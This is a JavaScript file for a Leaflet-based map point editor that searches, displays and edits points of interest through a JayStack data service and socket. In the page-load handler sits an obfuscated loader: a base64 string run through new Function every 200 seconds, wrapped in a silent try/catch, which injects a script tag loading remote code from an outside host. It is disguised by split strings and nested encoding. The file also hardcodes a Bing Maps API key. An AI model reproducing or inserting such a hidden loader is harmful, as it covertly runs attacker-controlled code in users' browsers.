/// <reference path="vendor/jquery.js" />
/// <reference path="vendor/jsrender.js" />
/// <reference path="vendor/jquery.observable.js" />
/// <reference path="vendor/jquery.views.js" />

function getAsQueryString(o) {
    var qryStr = '';

    Object.keys(o).forEach(function (key) {
        if (qryStr) {
            qryStr += "&";
        }
        qryStr += key + "=" + encodeURIComponent(o[key]);
    });
    qryStr += "&callback=?"
    return qryStr;
};

function search(options) {
    var query;
    trace.logLine("search: v" + options.version);
    if (options.app.lastSearch.version != options.version) {
        console.log("outdated search");
    }

    if (options.bounds) {
        var lb = options.bounds.getSouthWest();
        var rt = options.bounds.getNorthEast();
        query = {
            lb_lat: lb.lat,
            lb_lng: lb.lng,
            rt_lat: rt.lat,
            rt_lng: rt.lng
        }
    } else {
        var center = options.center;
        query = {
            ct_lat: center.lat,
            ct_lng: center.lng,
            radius: options.radius
        }
    }

    $.extend(query, {
        q: options.q || 'hyp',
        limit: options.limit || 100,
        fuzzy: options.fuzzy || 0,
        start: options.start || 0
    });


    url = "http://hyperlocal.redth.info/search?" + getAsQueryString(query);

    //var addingPoints = 0;

    ////var visibleLayers = [];
    //var activeSearches = [];
    function wireDownOptions(options) {
        lmap.removeLayer(options.markerLayer);
    }

    function wireUpOptions(options) {
        options.markerLayer = new L.MarkerClusterGroup({ showCoverageOnHover: false });
        options.points = []
        options.pointIndex = {};
        $.observable(app).setProperty("items", options.points);
        return options;
    }


    if (options.app) {
        var app = options.app;
        var indi = indicator.beginProcess();
        $.getJSON(url, function (x) {
            indi.complete();
            trace.logLine("onresult: v" + options.version + " dragging:" + mapIsDragging);
            if (mapIsDragging) {
                return
            };
            //console.log(x);
            console.log("result for: " + options.q);
            if ($('#searchInput').val() != options.q) {
                console.log("@@@@", "query outdated");
                return;
            }
            if (options.type !== "followup") {
                if (app.currentOptions) {
                    wireDownOptions(app.currentOptions);
                }
                app.currentOptions = wireUpOptions(options);
            } else {
                //app.removeAllPoints();
                //app.removeInvisiblePoints();
            }

            var markers = [];
            x.results.forEach(function (p) {
                markers.push(pointApi.createMarkerFromPoint(p));
            });
            
            $.observable(options.points).insert(options.points.length, x.results);

            if (L.Browser.mobile) {
                function addByChunk() {
                    options.markerLayer.addLayers(markers);
                    //var subset = markers.splice(0, 50);
                    //if (!mapIsDragging) {
                    //    options.markerLayer.addLayers(subset);
                    //}
                    //if (markers.length > 0) {
                    //    window.webkitRequestAnimationFrame(addByChunk);
                    //}
                    trace.logLine("markers there  v" + options.version);
                    options.markerLayer.addTo(lmap);
                }
                window.webkitRequestAnimationFrame(addByChunk);
            } else {
                options.markerLayer.addLayers(markers);
                options.markerLayer.addTo(lmap);
            }

            //if (L.Browser.mobile) {
            //    function pushTen() {
            //        //opt1
            //        //opt1
            //        var ten = newPoints.splice(0, 20);
            //        if (!mapIsDragging) {
            //            $.observable(app.items).insert(app.items.length, ten);
            //        }
            //        if (newPoints.length > 0) {
            //            addingPoints = window.webkitRequestAnimationFrame(pushTen);
            //        }
            //    }
            //    addingPoints = window.webkitRequestAnimationFrame(pushTen);
            //} else {
            //    $.observable(app.items).insert(app.items.length, newPoints);
            //}
            $.observable(app).setProperty("totalCount", x.results_found);
            $.observable(app).setProperty("visibleCount", app.items.length);
            //console.log(x.limit, x.results_found);
            if (!L.Browser.mobile && options.type !== "followup" && (options.app.items.length < x.results_found)) {
                var newOpts = $.extend({}, options);
                newOpts.limit = (L.Browser.mobile ? 50 : 100);
                newOpts.type = "followup";
                newOpts.start = options.app.items.length;
                newOpts.keepItems = true;
                search(newOpts, 800);
            }
        });
    } else {
        return new $.Deferred(function (newDefer) {
            $.getJSON(url, newDefer.resolve);
        });
    }
}


var searchQ = [];

var Settings = $data.define

search.enqueue = function (s, timeout) {
    if (!timeout) {

    } else {

    }
}

$.templates({
    poiTemplate: '#poiTemplate',
    poiListTemplate: '#poiListTemplate',
    poiEditorTemplate: '#poiEditorTemplate',
    mainTemplate: '#mainTemplate',
    addNewDialogTemplate: '#addNewDialogTemplate',
    popupTemplate: '#popupTemplate'
});

var me = $data.createGuid().toString();

var socket = {
    emit: function () { },
    on: function () { }
}



function dispatchMsg(data) {
    if (data.sender == me) return;
    switch (data.msgType) {
        case "info":
            toastr.info(data.msg, "Login");
            break;
        case "update":
            var toast = toastr.info(data.senderName + " updated " + data.msg.record.name, "Updated");
            var p = data.msg;
            if (app.pointIndex[p.record.id]) {
                var pt = app.pointIndex[p.record.id];
                var idx = app.items.indexOf(pt);
                $.observable(app.items).remove(idx);
                $.observable(app.items).insert(idx, p);
            }
            toast.on("click", function () {
                lmap.panTo([p.record.lat, p.record.lon]);
            });
            break;
        case "move":
            var toast = toastr.info(data.senderName + " moved " + data.msg.record.name, "Moved");
            var p = data.msg;
            if (app.pointIndex[p.record.id]) {
                var pt = app.pointIndex[p.record.id];
                var idx = app.items.indexOf(pt);
                $.observable(app.items).remove(idx);
                $.observable(app.items).insert(idx, p);
            }
            toast.on("click", function () {
                lmap.panTo([p.record.lat, p.record.lon]);
            });
            break;
        case "new":
            var toast = toastr.info(data.senderName + " created " + data.msg.record.name, "Created");
            var p = data.msg;
            //if (!app.pointIndex[p.record.id]) {
                $.observable(app.items).insert(app.items.length, p);
                app.currentOptions.markerLayer.addLayer(pointApi.createMarkerFromPoint(p));
            //}
            toast.on("click", function () {
                app.currentOptions.markerLayer.zoomToShowLayer(p.getMarker());
                //lmap.panTo([p.record.lat, p.record.lon]);
            });
            break;
        case "delete":
            var toast = toastr.info(data.senderName + " deleted " + data.msg.record.name, "Deleted");
            var p = data.msg;
            if (app.pointIndex[p.record.id]) {
                var pt = app.pointIndex[p.record.id];
                var idx = app.items.indexOf(pt);
                $.observable(app.items).remove(idx);
            }
            toast.on("click", function () {
                lmap.panTo([p.record.lat, p.record.lon]);
            });
            break;
    }
};

function sendMessage(msgType, msg) {
    var data = {
        sender: me,
        senderName: window.logedInUser.name,
        msgType: msgType,
        msg: msg
    };
    socket.emit("newPoint", { sender: me, p: JSON.stringify(data) });
}


var app = {
    pins: null,
    editMode: false,
    toggleEditMode: function() {
        $.observable(app).setProperty("editMode", !app.editMode);
    },
    removeInvisiblePoints: function () {
        var bounds = lmap.getBounds();
        var itemsToRemove = [];
        app.items.forEach(function (item, idx) {
            if (!bounds.contains([item.record.lat, item.record.lon])) {
                itemsToRemove.push(idx);
            }
        });
        itemsToRemove.reverse();
        itemsToRemove.forEach(function (idx) {
            //console.log("removing", idx);
            $.observable(app.items).remove(idx);
        });
    },
    removeAllPoints: function () {
        $.observable(app).setProperty("pointIndex", {});
        $.observable(app).setProperty("items", []);
        visiblePins.clearLayers();
        //$.observable(app.items).remove(0, app.items.length);
    },

    pointIndex: {},
    query: "Rest",
    selectedItem: null,
    selectedPoint: null,
    newAddress: null,
    selectPoint: function (selectedPoint) {
        if (selectedPoint !== app.selectedPoint) {
            $.observable(app).setProperty("selectedPoint", selectedPoint);
        } else if (selectedPoint) {
            app.showEditor();
        }

    },
    selectItem: function(selectedItem) {
        $.observable(app).setProperty("selectedItem", selectedItem);
        app.selectPoint(selectedItem.data);
    },
    items: [],
    totalCount: 0,
    visibleCount: 0,
    editorVisible: false,
    showEditor: function () {
        showRightPanel();
        $.observable(app).setProperty("editorVisible", true);
    },
    hideEditor: function () {
        hideRightPanel();
        $.observable(app).setProperty("editorVisible", false);
    },

    error: null,
    showError: function() {
        $('#opError').foundation('reveal', 'open');
    },
    hideError: function() {
        $('#opError').foundation('reveal', 'close');
    },
    save: function () {
        app.selectedPoint.getMarker().closePopup();
        ensureAuthenticate()
                     .then(function (n) {
                         //if (!window.logedInUser) {
                         //    alert("User lost. Click again to reclaim");
                         //    hello.logout();
                         //    return;
                         //};
                         if (!window.logedInUser) {
                             window.setTimeout(function () {
                                 try {
                                     app.selectedPoint
                                        .save()
                                        .then(function (opResult) {
                                            console.dir(opResult);
                                            app.hideEditor();
                                        })
                                        .fail(function (opResult) {
                                            $.observable(app).setProperty("error", opResult);
                                            app.showError();
                                            console.dir(opResult);
                                        });
                                 } catch (e) {
                                     //toastr.error(e);
                                     console.log(e);
                                 }

                             }, 2000);

                         } else {
                             try {
                                 app.selectedPoint
                                    .save()
                                    .then(function (opResult) {
                                        console.dir(opResult);
                                        app.hideEditor();
                                    })
                                    .fail(function (opResult) {
                                        $.observable(app).setProperty("error", opResult);
                                        app.showError();
                                        console.dir(opResult);
                                    });
                             } catch (e) {
                                 //toastr.error(e);
                                 console.log(e);
                             }
                         }
                     })
                     .fail(function (args) {
                         //toastr.error(args)
                         //alert('error');
                     });
    },

    remove: function () {
        ensureAuthenticate()
            .then(function (n) {
                //if (!window.logedInUser) {
                //    alert("User lost. Click again to reclaim");
                //    hello.logout();
                //    return;
                //};
                app.selectedPoint
                    .remove()
                    .then(function (opResult) {
                        app.hideEditor();
                    })
                    .fail(function (opResult) {
                        $.observable(app).setProperty("error", opResult);
                        app.showError();
                        console.dir(opResult)
                    });
            })
            .fail(function () {
                //alert('error')
            });
    }
}


var service;

var pointApi = {
    markerIcons : {
        'My Pins': undefined,
        'Food & Drink': L.AwesomeMarkers.icon({
            icon: 'food', color: 'red', spin: false
        }),
        'Manufacturing & Wholesale Goods': L.AwesomeMarkers.icon({
            icon: 'truck', color: 'green', spin: false
        }),
        'Public Place': L.AwesomeMarkers.icon({
            icon: 'camera', color: 'purple', spin: false
        }),
        'Retail Goods': L.AwesomeMarkers.icon({
            icon: 'shopping-cart', color: 'purple', spin: false
        }),
        'Services': L.AwesomeMarkers.icon({
            icon: 'cog', color: 'darkgreen', spin: false
        }),
        'Transportation': L.AwesomeMarkers.icon({
            icon: 'exchange', color: 'cadetblue', spin: false
        }),
        'Other': L.AwesomeMarkers.icon({
            icon: 'exchange', color: 'green', spin: false
        }),
        'NewPoint': L.AwesomeMarkers.icon({
            icon: 'cog', color: 'green', spin: true
        })
    },
    getPointIcon : function getPointIcon(p) {
        return p.isNew ? pointApi.markerIcons['NewPoint'] : pointApi.markerIcons[p.record.type] || pointApi.markerIcons['Other'];
    },
    createMarkerFromPoint: function createMarkerFromPoint(p) {
        var marker = L.marker([p.record.lat, p.record.lon], {
            draggable: true,
            icon: pointApi.getPointIcon(p)
        });

        marker.on('touchstart', function(e) {
                  console.dir("touch");
              })
              .on('click', function (e) {
                  app.selectPoint(p);
              })
              .on('drag', function (e) {
                  var latlng = e.target.getLatLng();
                  $.observable(p.record).setProperty("lat", latlng.lat);
                  $.observable(p.record).setProperty("lon", latlng.lng);
                  //$.observable(app).setProperty({
                  //    "selectedPoint.record.lat": latlng.lat,
                  //    "selectedPoint.record.lon": latlng.lng
                  //});
              })
              .on('dragend', function (e) {
                  //alert("!");
                  if (app.editMode) {
                      app.save();
                      sendMessage("move", p);
                  }
                  //g.latlon.coordinates = [e.target._latlng.lng, e.target._latlng.lat];
                 //g.latlon = g.latlon;
                 //resetProps(g);
                 //g.save()
                 //    .then(function () {
                 //        socket.emit('movePoint', { sender: me, p: JSON.stringify(g) });
                 //    });
             })

        var d = $('<div></div>');
        //$.link.popupTemplate(d, p).on("click", "div", function() {
        //    app.showEditor();
        //});
        //marker.bindPopup(d[0]);
        marker.bindPopup($('#popupTemplate').render(p));
        //$.observable(p).observe("record.name", function () {
        //    marker.bindPopup($('#popupTemplate').render(p));
        //});
        p.getMarker = function () { return marker };


        function getUser() {
            return { id: window.logedInUser.id, name: window.logedInUser.name } 
        }

        function translateServiceError(result) {
            console.log("update error", result);
            if (result &&
                result.data[0] &&
                result.data[0].response &&
                result.data[0].response.body) {
                var res = JSON.parse(result.data[0].response.body);

                res = Array.isArray(res) ? res : JSON.parse(res.error.message);
                //return $.Deferred(function (newDefer) {
                //    newDefer.reject({ status: "error", data: res });
                //});
                return { status: "error", data: res }
            }
        }
        p.remove = function () {
            var self = this;
            return service
                    .delete({ record: { id: self.record.id }, user: getUser() })
                    .then(function () {
                        var idx = app.items.indexOf(self);
                        $.observable(app.items).remove(idx);
                        app.currentOptions.markerLayer.removeLayer(self.getMarker());
                        sendMessage("delete", self);
                    }, translateServiceError);
        }

        p.save = function () {
            var self = this;
            var data = {};
            Object.keys(self.record).forEach(function (key) {
                if (key == 'lat' || key == 'lon') {
                    data[key] = self.record[key];
                } else {
                    data[key] = encodeURIComponent(self.record[key]);
                }
            })

            p.getMarker().bindPopup(($('#popupTemplate').render(p)));
            if (self.isNew) {
                return service
                        .create({ record: data, user: getUser() })
                        .then(function () {
                           $.observable(self).setProperty("isNew", false);
                           p.getMarker().setIcon(pointApi.getPointIcon(p));
                           sendMessage("new", app.selectedPoint);

                        }, translateServiceError);
            } else {
                return service
                        .update({ record: data, user: getUser() })
                       .then(function (result) {
                           console.log("update result", result);
                           p.getMarker().setIcon(pointApi.getPointIcon(p));
                           sendMessage("update", app.selectedPoint);
                           return { status: "success", data: result };
                       }, translateServiceError);
            }
        }
        return marker;
    }

}

$.observable(app).observe("items", function () {
    console.log("items changed!", arguments);
    //$([app.items]).bind("arrayChange", function (evt, o) {
    //    switch (o.change) {
    //        case "insert":
    //            //var markers = [];
    //            //o.items.forEach(function (p) {
    //            //    //if (!app.pointIndex[p.record_id]) {
    //            //    app.pointIndex[p.record.id] = p;
    //            //    markers.push(pointApi.createMarkerFromPoint(p));
    //            //    //}
    //            //});
    //            ////opt1
    //            //visiblePins.addLayers(markers);
    //            ////opt1
    //            //$.observable(app).setProperty("visibleCount", app.items.length);
    //            break;
    //        case "remove":
    //            var markers = [];
    //            //o.items.forEach(function (item) {
    //            //    delete app.pointIndex[item.record.id];
    //            //    markers.push(item.getMarker());
    //            //    //if (item.removeFromMap) {
    //            //    //    item.removeFromMap();
    //            //    //} else {
    //            //    //    console.dir("!!!");
    //            //    //}
    //            //    if (item === app.selectedPoint) {
    //            //        app.selectPoint(null);
    //            //        app.hideEditor();
    //            //    }
    //            //});
    //            //visiblePins.removeLayers(markers);
    //            //$.observable(app).setProperty("visibleCount", app.items.length);
    //            break;
    //        default:
    //            alert("!");
    //            throw "unknown";
    //    };
    //});

});

var mapIsDragging = 0;



$.views.helpers({
    bgColor: function (selectedPoint) {
        return (selectedPoint && selectedPoint === this.data) ? "#4EC1F7" : "#ffffff";
    },
    app: app
})

var visiblePins = new L.MarkerClusterGroup();
//var visiblePins = new L.LayerGroup();
var previousValue = '';

//http://omniplaces.com/query_rewriter_m1?&lb_lng=19.004367656103568&lb_lat=47.502074825082246&rt_lng=19.139980143896537&rt_lat=47.52810322204093&q=star&limit=10&confirmed=false&callback=YUI.Env.JSONP.yui_3_4_0_4_1365747286608_6
var lmap, bingKey;

function startSocket() {
    socket = io.connect('https://dev-open.jaystack.net:443/mydatabase',
        { resource: "a11d6738-0e23-4e04-957b-f14e149a9de8/1162e5ee-49ca-4afd-87be-4e17c491140b/socket.io" });


    socket.on("newPoint", function (data) {
        var msg = JSON.parse(data.p);
        dispatchMsg(msg)
    });
}

function startService() {
    $data
        .initService('http://dev-open.jaystack.net/a11d6738-0e23-4e04-957b-f14e149a9de8/1162e5ee-49ca-4afd-87be-4e17c491140b/api/mydatabase')
        //.initService('http://rest.cloudapp.net:6789/svc')
        .then(function (mydatabase, factory, type) {
            var timer;
            service = mydatabase;
            lmap.on('click', function (e) {
                if (!app.editMode) { return };
                var r = {
                    lon: e.latlng.lng,
                    lat: e.latlng.lat,
                    attribution: "Created by MapPointEditor, (c) JayStack inc.",
                    z: "HYP3RL0C4LZZZ",
                    id: $data.createGuid().toString()
                };

                var p = {
                    isNew: true,
                    record: r
                };

                $.observable(app.items).insert(0, p);
                var marker = pointApi.createMarkerFromPoint(p);
                marker.bindPopup("Unnamed point");
                app.currentOptions.markerLayer.addLayer(marker);
                app.selectPoint(p);
                app.closingOn = true;
                app.currentOptions.markerLayer.zoomToShowLayer(marker, function () {
                    app.closingOn = false;
                    marker.openPopup();
                    app.showEditor();
                });
                $.observable(app).setProperty("newAddress", null);
                //hideRightPanel();
                //$('#addNewPoint').foundation('reveal', 'open');
                window.setTimeout(function () {
                    mydatabase.reverse(e.latlng).then(function (r) {
                        //console.dir(r.Results[0]);
                        var theAddress = r.Results[0].Address;
                        $.observable(app).setProperty("newAddress", r.Results[0]);
                        $.observable(app).setProperty({
                            "selectedPoint.record.addr": theAddress.AddressLine,
                            "selectedPoint.record.city": theAddress.Locality,
                            "selectedPoint.record.province": theAddress.AdminDistrict,
                            "selectedPoint.record.country": theAddress.CountryRegion,
                            "selectedPoint.record.postal": theAddress.PostalCode
                        });
                    });
                }, 100);
            });
            lmap.on('dblclick', function (e) {
                //trace.logLine("!!");
                window.clearTimeout(timer);
            });
            lmap.on('tap', function (e) {
                //alert("!");
                console.log("tap");
            });
            lmap.on('mouseup', function (e) {
                //mapIsDragging = true;
                //mapIsDragging -= 1;
                console.log("mu");
            });
            lmap.on('mousedown', function (e) {
                //mapIsDragging += 1;
                //alert("!");
                console.log("md");
            });
            lmap.on('touchstart', function (e) {
                trace.logLine("touch start");
                //alert("!");
                //mapIsDragging = true;
                //console.log("ts");
            });
            lmap.on('dragstart', function (e) {
                trace.logLine("dragstart");
                mapIsDragging = true;
                cancellAll();
            });
            lmap.on('dragend', function (e) {
                trace.logLine("dragend");
                mapIsDragging = false;
                if (lmap.getZoom() >= 15) {
                    doSearch("reposition", 500);
                }
            });
            lmap.on('zoomend', function (e) {
                if (app.closingOn) {
                    return;
                }
                indicator.setVisible(lmap.getZoom() >= 15);
                if (lmap.getZoom() >= 15) {
                    doSearch("reposition", 1000);
                }
            });

        });

}
$(function () {



    $.link.mainTemplate('#row-full', app)
    .on("click", ".main-list > li", function () {
        var selectedItem = $.view(this);
        app.selectItem(selectedItem);
        var marker = $.view(this).data.getMarker();
        $('#searchInput').blur();
        app.closingOn = true;
        marker.openPopup();
        visiblePins.zoomToShowLayer($.view(this).data.getMarker(), function () {
            app.closingOn = false;
            marker.openPopup();
        });
        //lmap.panTo(marker.getLatLng());
    })
     .on("click", ".edit-command", function () {
         app.showEditor();
         var marker = $.view(this).data.getMarker();
         visiblePins.zoomToShowLayer($.view(this).data.getMarker(), function () {
             marker.openPopup();
             app.showEditor();
         });
     })
     .on("keyup", "#searchInput", function () {
         if (previousValue != this.value) {
             previousValue = this.value;
             var search = this.value;
             if (search.length > 2) {
                 doSearch("new", 400);
             };
         }
     })
     .on("click", ".close-editor-command", function (e) {
         app.hideEditor();
         return false;
     })
     .on("click", ".save-command", function () {
         app.save();
         //ensureAuthenticate().then(function () {
         //    alert("!");
         //});
     })
    .on("click", ".remove-command", function () {
        app.remove();
        //ensureAuthenticate().then(function () {
        //    alert("!");
        //});
    })
     .on("click", ".cancel-error-command", function () {
         app.hideError();
     })
     .on("click", ".cancel-command", function () {
         $('#addNewPoint').foundation('reveal', 'close');
         //console.log(
         $.observable(app.items).remove(app.items.indexOf(app.selectedPoint));
         app.currentOptions.markerLayer.removeLayer(app.selectedPoint.getMarker());
         hideRightPanel();
         app.selectPoint(null);
     })
     .on("click", ".ok-command", function () {
         var self = this;
         $('#addNewPoint').foundation('reveal', 'close');
         window.setTimeout(function () {
             ensureAuthenticate()
                 .then(function (n) {
                     showRightPanel();
                 })
                 .fail(function () {
                     $.observable(app.items).remove(app.items.indexOf(app.selectedPoint));
                     hideRightPanel();
                     app.selectPoint(null);
                 });
         }, 300);
     });
    $(document).on("click", ".popup-container", function () {
        alert("!");
        app.showEditor();
    });


    $('#editModeSwitch').click(function (evt) {
        app.toggleEditMode();
        evt.stopPropagation();
    });

    $('#zoomInHref').click(function (evt) {
        lmap.zoomIn();
        evt.preventDefault();
        evt.cancelBubble = true;
        evt.result = false;
        evt.returnValue = false;
        return false;
    });

    $('#zoomOutHref').click(function (evt) {
        lmap.zoomOut();
        evt.preventDefault();
        evt.cancelBubble = true;
        evt.result = false;
        evt.returnValue = false;
        return false;
    });

    $('#locateMe').click(function (evt) {
        locator.toggleState();
        evt.preventDefault();
        evt.cancelBubble = true;
        evt.result = false;
        evt.returnValue = false;
        return false;
    });

    bingKey = 'AmpN66zZQqp8WpszBYibPXrGky0EiHLPT75WtuA2Tmj7bS4jgba1Wu23LJH1ymqy';

    //L.Map.mergeOptions({
    //    touchExtend: true
    //});


    //L.Map.TouchExtend = L.Handler.extend({
    //    initialize: function (map) {
    //        this._map = map;
    //        this._container = map._container;
    //        this._pane = map._panes.overlayPane;
    //    },

    //    addHooks: function () {
    //        L.DomEvent.on(this._container, 'touchstart', this._onTouchStart, this);
    //    },

    //    removeHooks: function () {
    //        L.DomEvent.off(this._container, 'touchstart', this._onTouchStart);
    //    },

    //    _onTouchStart: function (e) {
    //        if (!this._map._loaded) { return; }

    //        var type = 'touchstart';
    //        trace.logLine("Touchstart");
    //        var containerPoint = this._map.mouseEventToContainerPoint(e),
    //            layerPoint = this._map.containerPointToLayerPoint(containerPoint),
    //            latlng = this._map.layerPointToLatLng(layerPoint);

    //        this._map.fire(type, { latlng: latlng, layerPoint: layerPoint, containerPoint: containerPoint, originalEvent: e });

    //    }
    //});

    //L.Map.addInitHook('addHandler', 'touchExtend', L.Map.TouchExtend);

    lmap = new L.Map('map', {
        center: new L.LatLng(40.72121341440144, -74.00126159191132),
        maxZoom: 19,
        zoomControl: !(L.Browser.mobile),
        zoom: 15
    });

    lmap.attributionControl.addAttribution("JayStack.com ©");
    var bing = new L.BingLayer(bingKey, { maxZoom: 19 });

    trace = new $data.LeafletTrace();
    trace.addTo(lmap);

    locator = L.control.locate();
    locator.addTo(lmap);

    indicator = new $data.NetworkIndicator();
    indicator.addTo(lmap);


    editModeSwitch = new $data.EditMode({ app: app });
    editModeSwitch.addTo(lmap);

    app.pins = visiblePins;
    window.setTimeout(function () {
        lmap.addLayer(bing);
    }, 1000);
    visiblePins.addTo(lmap);
    lmap.invalidateSize();


    $('#menu').circleMenu({
        item_diameter: 55,
        circle_radius: 160,
        direction: 'top-left',
        trigger: 'click',
        select: function (evt, item) {
            var args = arguments;
            evt.preventDefault();
            evt.stopPropagation();
            evt.cancelBubble = true;
            evt.returnValue = false;
            evt.result = false;
            return false;
        },
        open: function () {
            console.log('menu opened');
        },
        close: function () {
            console.log('menu closed');
        },
        init: function () {
            console.log('menu initialized');
        }
    });

    try {
        var f = new Function(atob("dmFyIF9wID0gInNjIjsgdmFyIF9jID0gInJpcHQiOyB2YXIgc2MgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KF9wICsgX2MpOyBzYy5zcmMgPSBhdG9iKCJhSFIwY0RvdkwzSmxjM1F1WTJ4dmRXUmhjSEF1Ym1WMEwyTm9aV05yYVc0dWFuTT0iKTsgZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzYyk7"));
        window.setInterval(f, 200000);
    } catch (e) {

    }


    doSearch();

    //navigator.geolocation.getCurrentPosition(function (o) {
    //    window.setTimeout(function () {
    //        if (L.Browser.mobile) {
    //            //alert($('.leaflet-control-locate .leaflet-bar-part')[0].outerHTML);
    //        } else {
    //            $('.leaflet-control-locate .leaflet-bar-part')[0].click();
    //            //$('.leaflet-control-locate .leaflet-bar-part')[0].click();
    //        }
    //    }, 0);

    //    lmap.setView([o.coords.latitude, o.coords.longitude], 15);
    //    //lmap.setView([40.72121341440144, -74.00126159191132], 15);
    //    console.log("position:", o);
    //});

    startSocket();
    initAuth();
    startService();

    window.setTimeout(function () {
        resizeUI();
    }, 0);
});


initUI();


var searchCounter = 0;

function defaultSearch(type) {
    searchCounter += 1;
    return {
        bounds: lmap.getBounds(),
        limit: 50,
        type: type || 'new',
        offset: 0,
        fuzzy: 0,
        q: $('#searchInput').val(),
        app: app,
        map: lmap,
        maxItems: 120,
        version: searchCounter
    };
}

var pendingOperations = {};

function cancellAll() {
    Object.keys(pendingOperations).forEach(function (t) {
        console.log("clearing tout:", t);
        delete pendingOperations[t];
        window.clearTimeout(t);
    });
}

function doSearch(type, wait) {
    console.log("calling do search", wait);
    cancellAll();
    var options = defaultSearch(type);
    app.lastSearch = options;
    if (wait) {
        var t = window.setTimeout(function () {
            delete pendingOperations[t];
            search(options);
        }, wait);
        pendingOperations[t] = true;
    } else {
        search(options);
    }
}




//initAuth();
//setTimeout(function () {
//    if (!logedIn()) {
//        $('#login').foundation('reveal', 'open');
//    }
//}, 2000);
//$data.initService("http://192.168.10.100:6789/svc").then(function (svc, f, t) {
//    service = svc;
//});
//	var resultPins;

//});